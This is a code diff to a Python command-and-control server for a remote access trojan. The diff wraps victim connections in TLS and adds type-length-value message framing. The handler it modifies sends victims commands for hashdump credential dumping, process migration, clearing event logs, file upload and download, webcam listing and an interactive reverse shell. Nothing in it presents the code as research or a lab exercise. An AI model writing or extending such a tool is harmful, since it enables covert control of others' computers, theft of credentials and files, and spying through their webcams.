@@ -8,6 +8,8 @@ from datetime import datetime
 from os import path, makedirs
 import os
 from colorama import Fore, init
+import ssl  # Import the ssl module for TLS
+import struct  # Import struct module for TLV
 
 init(autoreset=True)
 
@@ -40,11 +42,27 @@ html_template = """
 </html>
 """
 
+# TLV Types
+TLV_TYPE_COMMAND = 1
+TLV_TYPE_RESPONSE = 2
+TLV_TYPE_KEYLOGGER = 3
+TLV_TYPE_STREAM = 4
+
+def tlv_encode(tlv_type, value):
+    length = len(value)
+    return struct.pack("!I", tlv_type) + struct.pack("!I", length) + value
+
+def tlv_decode(data):
+    tlv_type = struct.unpack("!I", data[:4])[0]
+    length = struct.unpack("!I", data[4:8])[0]
+    value = data[8:8+length]
+    return tlv_type, value
+
 def start_streaming(client_socket, mode, client_id):
     global streaming
     streaming = True
     target_ip = client_id.split(":")[0]
-    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get the current date and time 
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     print(Fore.BLUE + "[ * ] Starting streaming session...")
     time.sleep(1)
@@ -141,23 +159,30 @@ def handle_client(client_socket, addr):
             break
 
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
-        client_socket.send(command.encode('utf-8'))
+        command_tlv = tlv_encode(TLV_TYPE_COMMAND, command.encode('utf-8'))
+        client_socket.send(command_tlv)
 
         # Handle commands
         if command == "hashdump":
             print(Fore.YELLOW + "[ * ] Starting...")
-            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + response)
+            response_tlv = client_socket.recv(4096)
+            tlv_type, response = tlv_decode(response_tlv)
+            if tlv_type == TLV_TYPE_RESPONSE:
+                print(Fore.WHITE + response.decode('utf-8', errors='ignore'))
 
         elif command == "migrate":
             print(Fore.YELLOW + "[ * ] Starting...")
-            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + response)
+            response_tlv = client_socket.recv(4096)
+            tlv_type, response = tlv_decode(response_tlv)
+            if tlv_type == TLV_TYPE_RESPONSE:
+                print(Fore.WHITE + response.decode('utf-8', errors='ignore'))
 
         elif command == "clearev":
             print(Fore.YELLOW + "[ * ]  Starting......")
-            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + response)
+            response_tlv = client_socket.recv(4096)
+            tlv_type, response = tlv_decode(response_tlv)
+            if tlv_type == TLV_TYPE_RESPONSE:
+                print(Fore.WHITE + response.decode('utf-8', errors='ignore'))
 
         elif command.startswith("upload"):
             # Parse the upload command to extract file path and destination
@@ -174,9 +199,12 @@ def handle_client(client_socket, addr):
                     print(Fore.RED + "[ * ] Destination path not provided.")
                     continue
 
-                client_socket.send(command.encode('utf-8'))  # Send upload command to client
-                response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-                print(Fore.WHITE + response)
+                command_tlv = tlv_encode(TLV_TYPE_COMMAND, command.encode('utf-8'))
+                client_socket.send(command_tlv)  # Send upload command to client
+                response_tlv = client_socket.recv(4096)
+                tlv_type, response = tlv_decode(response_tlv)
+                if tlv_type == TLV_TYPE_RESPONSE:
+                    print(Fore.WHITE + response.decode('utf-8', errors='ignore'))
 
             except Exception as e:
                 print(Fore.RED + f"[ * ] Error: {e}")
@@ -200,9 +228,12 @@ def handle_client(client_socket, addr):
 
         elif command.startswith("webcam_list"):
             print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
-            client_socket.send(command.encode('utf-8'))
-            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
+            command_tlv = tlv_encode(TLV_TYPE_COMMAND, command.encode('utf-8'))
+            client_socket.send(command_tlv)
+            response_tlv = client_socket.recv(4096)
+            tlv_type, response = tlv_decode(response_tlv)
+            if tlv_type == TLV_TYPE_RESPONSE:
+                print(Fore.WHITE + "[ * ] Available Webcams:\n" + response.decode('utf-8', errors='ignore'))
         
         elif command.startswith("download"):
             # Parse the download command to extract file path
@@ -213,7 +244,8 @@ def handle_client(client_socket, addr):
                     continue
 
                 file_to_download = parts[1]
-                client_socket.send(command.encode('utf-8'))  # Send download command to client
+                command_tlv = tlv_encode(TLV_TYPE_COMMAND, command.encode('utf-8'))
+                client_socket.send(command_tlv)  # Send download command to client
 
                 # Receive the file data
                 with open(file_to_download, 'wb') as f:
@@ -228,16 +260,20 @@ def handle_client(client_socket, addr):
 
         elif command.startswith("shell"):
             # Start a reverse shell
-            client_socket.send(command.encode('utf-8'))
+            command_tlv = tlv_encode(TLV_TYPE_COMMAND, command.encode('utf-8'))
+            client_socket.send(command_tlv)
             print(Fore.YELLOW + "[ * ] Starting reverse shell...")
             while True:
                 shell_command = input(Fore.MAGENTA + f"shell ({client_id}) > ")
                 if shell_command.lower() in ["exit", "quit"]:
                     print(Fore.YELLOW + "[ * ] Exiting reverse shell.")
                     break
-                client_socket.send(shell_command.encode('utf-8'))
-                response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-                print(Fore.WHITE + response)
+                command_tlv = tlv_encode(TLV_TYPE_COMMAND, shell_command.encode('utf-8'))
+                client_socket.send(command_tlv)
+                response_tlv = client_socket.recv(4096)
+                tlv_type, response = tlv_decode(response_tlv)
+                if tlv_type == TLV_TYPE_RESPONSE:
+                    print(Fore.WHITE + response.decode('utf-8', errors='ignore'))
 
         elif command == "background":
             print(Fore.GREEN + f"[ * ] Session {client_id} sent to background.")
@@ -276,7 +312,13 @@ def handle_client(client_socket, addr):
                 del sessions[session_id]  # Remove the session from the dictionary
             print(Fore.GREEN + "[ * ] All sessions killed.")
 
-# Keep your existing `main` function and other logic below
+def load_certificates(context):
+    context.load_cert_chain(certfile='server.crt', keyfile='server.key')
+
+def wrap_socket_with_tls(sock):
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    load_certificates(context)
+    return context.wrap_socket(sock, server_side=True)
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -288,7 +330,11 @@ def main():
     while True:
         client_socket, addr = server_socket.accept()
         print(Fore.GREEN + f"[ * ] Connection established from {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
+
+        # Wrap the client socket with TLS
+        client_socket_tls = wrap_socket_with_tls(client_socket)
+
+        client_handler = threading.Thread(target=handle_client, args=(client_socket_tls, addr))
         client_handler.start()
 
 if __name__ == "__main__":
